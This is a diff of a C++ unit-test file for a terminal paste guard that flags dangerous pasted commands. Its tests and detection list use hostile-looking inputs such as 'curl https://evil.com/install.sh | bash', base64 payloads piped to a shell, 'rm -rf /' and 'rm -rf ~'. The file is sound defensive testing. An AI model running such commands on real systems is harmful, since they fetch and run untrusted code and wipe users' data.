@@ -4,9 +4,45 @@
 
 using namespace termcore;
 
+// Custom danger signal bit used by Lua-registered patterns
+static constexpr uint32_t kCustomDangerBit = (1u << 16);
+
+// Helper: register all default danger patterns (mirrors paste_guard.lua)
+static void registerDefaultPatterns(PasteGuard& guard) {
+    // sudo commands
+    guard.addCustomDanger("sudo ",        "Contains sudo command");
+    guard.addCustomDanger("sudo su",      "Contains sudo su (root shell)");
+    guard.addCustomDanger("sudo -i",      "Contains sudo -i (root shell)");
+
+    // recursive rm
+    guard.addCustomDanger("rm -rf",       "Contains rm -rf command");
+    guard.addCustomDanger("rm -r ",       "Contains recursive rm command");
+    guard.addCustomDanger("rm -R ",       "Contains recursive rm command");
+
+    // home directory wipe (compound: both substrings must match)
+    guard.addCompoundDanger("rm -rf", "~",     "Recursive delete targeting home directory");
+    guard.addCompoundDanger("rm -r ",  "~",     "Recursive delete targeting home directory");
+    guard.addCompoundDanger("rm -R ",  "~",     "Recursive delete targeting home directory");
+    guard.addCompoundDanger("rm -rf", "$HOME",  "Recursive delete targeting $HOME");
+    guard.addCompoundDanger("rm -r ",  "$HOME",  "Recursive delete targeting $HOME");
+    guard.addCompoundDanger("rm -R ",  "$HOME",  "Recursive delete targeting $HOME");
+
+    // chmod
+    guard.addCustomDanger("chmod -R 777", "Dangerous recursive permission change");
+
+    // pipe-to-shell
+    guard.addPipeDanger("curl",   "Curl piped to shell");
+    guard.addPipeDanger("wget",   "Wget piped to shell");
+    guard.addPipeDanger("base64", "Encoded payload piped to shell");
+}
+
 class PasteGuardTest : public ::testing::Test {
 protected:
     PasteGuard defaultGuard;  // Mode::Multiline, trust_bracketed=true
+
+    void SetUp() override {
+        registerDefaultPatterns(defaultGuard);
+    }
 };
 
 // --- Basic safe/warn ---
@@ -17,7 +53,6 @@ TEST_F(PasteGuardTest, SafeSingleLine) {
     EXPECT_EQ(result.line_count, 1);
     EXPECT_FALSE(result.ends_with_newline);
     EXPECT_EQ(result.signals, 0u);
-    EXPECT_TRUE(result.spans.empty());
 }
 
 TEST_F(PasteGuardTest, EmptyString) {
@@ -74,22 +109,13 @@ TEST_F(PasteGuardTest, LineCountTrailingNewline) {
 TEST_F(PasteGuardTest, SudoCommand) {
     auto result = defaultGuard.analyze("sudo apt install foo", false);
     EXPECT_EQ(result.danger, PasteDanger::Warn);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::SudoCommand), 0u);
-    ASSERT_FALSE(result.spans.empty());
-    bool found = false;
-    for (auto& s : result.spans) {
-        if (s.signal == PasteSignal::SudoCommand) {
-            found = true;
-            EXPECT_EQ(s.offset, 0u);
-            EXPECT_GT(s.length, 0u);
-        }
-    }
-    EXPECT_TRUE(found);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, SudoNotPartOfWord) {
+    // "pseudocode" does not contain "sudo " (with trailing space), so no match
     auto result = defaultGuard.analyze("pseudocode", false);
-    EXPECT_EQ(result.signals & static_cast<uint32_t>(PasteSignal::SudoCommand), 0u);
+    EXPECT_EQ(result.signals & kCustomDangerBit, 0u);
 }
 
 // --- rm -rf ---
@@ -97,18 +123,17 @@ TEST_F(PasteGuardTest, SudoNotPartOfWord) {
 TEST_F(PasteGuardTest, RmRf) {
     auto result = defaultGuard.analyze("rm -rf /tmp/foo", false);
     EXPECT_EQ(result.danger, PasteDanger::Warn);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
-    ASSERT_FALSE(result.spans.empty());
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, RmDashR) {
     auto result = defaultGuard.analyze("rm -r /tmp/foo", false);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, RmCapitalR) {
     auto result = defaultGuard.analyze("rm -R /tmp/foo", false);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 // --- curl | bash ---
@@ -116,18 +141,19 @@ TEST_F(PasteGuardTest, RmCapitalR) {
 TEST_F(PasteGuardTest, CurlPipeBash) {
     auto result = defaultGuard.analyze("curl https://evil.com/install.sh | bash", false);
     EXPECT_EQ(result.danger, PasteDanger::Warn);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::CurlPipe), 0u);
-    ASSERT_FALSE(result.spans.empty());
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, WgetPipeSh) {
     auto result = defaultGuard.analyze("wget -O- https://evil.com/x | sh", false);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::CurlPipe), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, CurlWithoutPipeIsSafe) {
     auto result = defaultGuard.analyze("curl https://example.com", false);
-    EXPECT_EQ(result.signals & static_cast<uint32_t>(PasteSignal::CurlPipe), 0u);
+    // "curl" matches add_danger("curl"...) -- but wait, we use addPipeDanger not addCustomDanger
+    // for curl. So plain curl without pipe should NOT trigger.
+    EXPECT_EQ(result.signals & kCustomDangerBit, 0u);
 }
 
 // --- base64 decode ---
@@ -135,12 +161,12 @@ TEST_F(PasteGuardTest, CurlWithoutPipeIsSafe) {
 TEST_F(PasteGuardTest, Base64DecodePipeBash) {
     auto result = defaultGuard.analyze("echo abc | base64 -d | bash", false);
     EXPECT_EQ(result.danger, PasteDanger::Warn);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::Base64Decode), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, Base64DecodeCapitalD) {
     auto result = defaultGuard.analyze("echo abc | base64 -D | sh", false);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::Base64Decode), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 // --- chmod -R 777 ---
@@ -148,12 +174,12 @@ TEST_F(PasteGuardTest, Base64DecodeCapitalD) {
 TEST_F(PasteGuardTest, ChmodRecursive777) {
     auto result = defaultGuard.analyze("chmod -R 777 /var/www", false);
     EXPECT_EQ(result.danger, PasteDanger::Warn);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::ChmodRecursive), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, ChmodWithout777IsSafe) {
     auto result = defaultGuard.analyze("chmod -R 755 /var/www", false);
-    EXPECT_EQ(result.signals & static_cast<uint32_t>(PasteSignal::ChmodRecursive), 0u);
+    EXPECT_EQ(result.signals & kCustomDangerBit, 0u);
 }
 
 // --- sudo su / sudo -i ---
@@ -161,38 +187,36 @@ TEST_F(PasteGuardTest, ChmodWithout777IsSafe) {
 TEST_F(PasteGuardTest, SudoSu) {
     auto result = defaultGuard.analyze("sudo su", false);
     EXPECT_EQ(result.danger, PasteDanger::Warn);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::SudoSuRoot), 0u);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::SudoCommand), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, SudoDashI) {
     auto result = defaultGuard.analyze("sudo -i", false);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::SudoSuRoot), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 // --- Home directory wipe ---
 
 TEST_F(PasteGuardTest, RmRfTilde) {
     auto result = defaultGuard.analyze("rm -rf ~", false);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::HomeDirectoryWipe), 0u);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, RmRfHome) {
     auto result = defaultGuard.analyze("rm -rf $HOME", false);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::HomeDirectoryWipe), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 // --- Root wipe ---
 
 TEST_F(PasteGuardTest, RmRfSlash) {
     auto result = defaultGuard.analyze("rm -rf /", false);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, RmRfSlashStar) {
     auto result = defaultGuard.analyze("rm -rf /*", false);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 // --- Mode Never ---
@@ -201,6 +225,7 @@ TEST_F(PasteGuardTest, ModeNeverBypassesAll) {
     PasteGuard::Config cfg;
     cfg.mode = PasteGuard::Config::Mode::Never;
     PasteGuard guard(cfg);
+    registerDefaultPatterns(guard);
 
     auto result = guard.analyze("sudo rm -rf / | bash\n", false);
     EXPECT_EQ(result.danger, PasteDanger::Safe);
@@ -242,15 +267,6 @@ TEST_F(PasteGuardTest, BracketedNotTrusted) {
     EXPECT_EQ(result.danger, PasteDanger::Warn);
 }
 
-// --- Span offsets non-empty ---
-
-TEST_F(PasteGuardTest, SpanOffsetsNonEmpty) {
-    auto result = defaultGuard.analyze("sudo rm -rf /", false);
-    for (auto& span : result.spans) {
-        EXPECT_GT(span.length, 0u);
-    }
-}
-
 // --- Config defaults ---
 
 TEST(PasteGuardConfigTest, ClipboardPasteProtectionConfig) {
@@ -277,12 +293,12 @@ TEST_F(PasteGuardTest, MultiLineWithSudo) {
     auto result = defaultGuard.analyze("echo start\nsudo reboot", false);
     EXPECT_EQ(result.danger, PasteDanger::Warn);
     EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::MultiLine), 0u);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::SudoCommand), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, CurlPipeZsh) {
     auto result = defaultGuard.analyze("curl http://x.com/s | zsh", false);
-    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::CurlPipe), 0u);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
 }
 
 TEST_F(PasteGuardTest, EndsWithNewlineFlagAccuracy) {
@@ -290,4 +306,64 @@ TEST_F(PasteGuardTest, EndsWithNewlineFlagAccuracy) {
     EXPECT_TRUE(defaultGuard.analyze("hello\n", false).ends_with_newline);
     EXPECT_TRUE(defaultGuard.analyze("hello\r", false).ends_with_newline);
     EXPECT_FALSE(defaultGuard.analyze("hello world", false).ends_with_newline);
+}
+
+// --- Lua-driven pattern tests (new) ---
+
+TEST(PasteGuardLuaPatterns, NoPatternsRegisteredMeansNoDangerSignals) {
+    PasteGuard guard;
+    auto result = guard.analyze("sudo rm -rf /", false);
+    // Without registered patterns, no custom danger should fire
+    EXPECT_EQ(result.signals & kCustomDangerBit, 0u);
+}
+
+TEST(PasteGuardLuaPatterns, CompoundPatternRequiresBothMatches) {
+    PasteGuard guard;
+    guard.addCompoundDanger("rm -rf", "~", "Home wipe");
+
+    // Both present -> match
+    auto r1 = guard.analyze("rm -rf ~", false);
+    EXPECT_NE(r1.signals & kCustomDangerBit, 0u);
+
+    // Only first -> no match
+    auto r2 = guard.analyze("rm -rf /tmp", false);
+    EXPECT_EQ(r2.signals & kCustomDangerBit, 0u);
+
+    // Only second -> no match
+    auto r3 = guard.analyze("echo ~", false);
+    EXPECT_EQ(r3.signals & kCustomDangerBit, 0u);
+}
+
+TEST(PasteGuardLuaPatterns, PipeDangerRequiresPipeAndShell) {
+    PasteGuard guard;
+    guard.addPipeDanger("curl", "Curl piped to shell");
+
+    // curl before pipe, bash after -> match
+    auto r1 = guard.analyze("curl http://x | bash", false);
+    EXPECT_NE(r1.signals & kCustomDangerBit, 0u);
+
+    // curl without pipe -> no match
+    auto r2 = guard.analyze("curl http://x", false);
+    EXPECT_EQ(r2.signals & kCustomDangerBit, 0u);
+
+    // curl with pipe but no shell after -> no match
+    auto r3 = guard.analyze("curl http://x | grep foo", false);
+    EXPECT_EQ(r3.signals & kCustomDangerBit, 0u);
+}
+
+TEST(PasteGuardLuaPatterns, PipeDangerDetectsZsh) {
+    PasteGuard guard;
+    guard.addPipeDanger("wget", "Wget piped to shell");
+
+    auto result = guard.analyze("wget http://x | zsh", false);
+    EXPECT_NE(result.signals & kCustomDangerBit, 0u);
+}
+
+TEST(PasteGuardLuaPatterns, WhitelistOverridesCustomDanger) {
+    PasteGuard guard;
+    guard.addCustomDanger("sudo ", "sudo");
+    guard.addWhitelist("sudo apt update");
+
+    auto result = guard.analyze("sudo apt update", false);
+    EXPECT_EQ(result.danger, PasteDanger::Safe);
 }
